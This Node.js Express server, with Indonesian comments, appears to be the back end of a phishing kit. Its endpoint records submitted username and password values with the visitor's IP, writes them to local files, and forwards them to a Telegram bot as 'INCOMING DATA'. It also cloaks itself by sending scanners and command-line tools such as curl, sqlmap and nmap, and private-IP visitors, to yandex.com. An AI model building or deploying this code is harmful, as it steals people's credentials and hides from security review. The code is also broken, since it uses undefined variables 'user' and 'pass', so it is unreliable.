import express from "express";
import crypto from "crypto";
import fs from "fs";
import path from "path";
import fetch from "node-fetch";
import dotenv from "dotenv";

dotenv.config();

const app = express();

// ===== PATH TMP (AMAN DI TERMUX & SERVERLESS) =====
const BASE_TMP = path.join(process.cwd(), "tmp");
if (!fs.existsSync(BASE_TMP)) fs.mkdirSync(BASE_TMP);

const SPAM_FILE = path.join(BASE_TMP, "antispam.txt");
const USED_FILE = path.join(BASE_TMP, "used.json");
const RATE_FILE = path.join(BASE_TMP, "rate.json");

// ===== CONFIG =====
const BOT_UA = [
  "curl","wget","python","httpclient","axios",
  "go-http","nikto","sqlmap","nmap","masscan","zgrab","scrapy"
];

const isDev = process.env.NODE_ENV === "development";

// ===== MIDDLEWARE =====
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// CORS (buat browser Android)
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "Content-Type, Accept, Accept-Language"
  );
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

// ===== UTIL =====
function getIP(req) {
  return req.headers["x-forwarded-for"]?.split(",")[0]
    || req.socket.remoteAddress
    || "";
}

function isPrivateIP(ip) {
  return (
    ip.startsWith("127.") ||
    ip.startsWith("10.") ||
    ip.startsWith("192.168.") ||
    ip === "::1"
  );
}

// ===== ENDPOINT =====
app.post("/api/apinet", async (req, res) => {
  const ip = getIP(req);
  const ua = (req.headers["user-agent"] || "").toLowerCase();

  // ===== ANTI BOT (DISABLE SAAT DEV) =====
  if (!isDev) {
    if (!ua || ua.length < 10 || BOT_UA.some(b => ua.includes(b))) {
      return res.redirect(302, "https://yandex.com");
    }

    if (!req.headers["accept-language"] || !req.headers["accept"]) {
      return res.redirect(302, "https://yandex.com");
    }

    if (!ip || isPrivateIP(ip)) {
      return res.redirect(302, "https://yandex.com");
    }
  }

  // ===== RATE LIMIT =====
  if (!fs.existsSync(RATE_FILE)) fs.writeFileSync(RATE_FILE, "{}");
  const rate = JSON.parse(fs.readFileSync(RATE_FILE, "utf8"));
  const now = Date.now();

  rate[ip] = (rate[ip] || []).filter(t => now - t < 60000);
  if (rate[ip].length >= 5) {
    return res.status(429).json({ error: "Too many requests" });
  }
  rate[ip].push(now);
  fs.writeFileSync(RATE_FILE, JSON.stringify(rate, null, 2));

  // ===== DATA (DEMO FIELD) =====
  const { login, A, B } = req.body;
  if (!A || !B) {
    return res.status(400).json({ error: "Missing field" });
  }

  // ===== ANTISPAM =====
  if (fs.existsSync(SPAM_FILE)) {
    const lines = fs.readFileSync(SPAM_FILE, "utf8").split("\n");
    if (lines.some(l => l.includes(A))) {
      return res.json({ ok: true, note: "duplicate ignored" });
    }
  }
  fs.appendFileSync(SPAM_FILE, `|${A}|${B}\n`);

  // ===== UNIQUE =====
  if (!fs.existsSync(USED_FILE)) fs.writeFileSync(USED_FILE, "{}");
  const used = JSON.parse(fs.readFileSync(USED_FILE, "utf8"));
  const key = crypto.createHash("md5").update(`${A}|${B}`).digest("hex");

  if (used[key]) {
    return res.json({ ok: true, note: "already exists" });
  }

  used[key] = {
    
    user,
    pass,
    ip,
    time: new Date().toISOString()
  };
  fs.writeFileSync(USED_FILE, JSON.stringify(used, null, 2));

  // ===== OPTIONAL: TELEGRAM (KALAU DIISI ENV) =====
if (process.env.BOT_TOKEN && process.env.CHAT_ID) {
  const msg = `
🧠 *INCOMING DATA*


📦 user     : \`${user}\`
📦 pass     : \`${pass}\`

🌍 IP    : \`${ip}\`
⏱ TIME  : \`${new Date().toISOString()}\`

#APINET 
`;

  await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: process.env.CHAT_ID,
      text: msg,
      parse_mode: "Markdown"
    })
  });
}

  // ===== RESPONSE =====
  return res.json({
    ok: true,
    dev: isDev,
    received: { login, user, pass }
  });
});

// ===== START =====
const PORT = process.env.PORT || 50000;
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on http://127.0.0.1:${PORT}`);
});


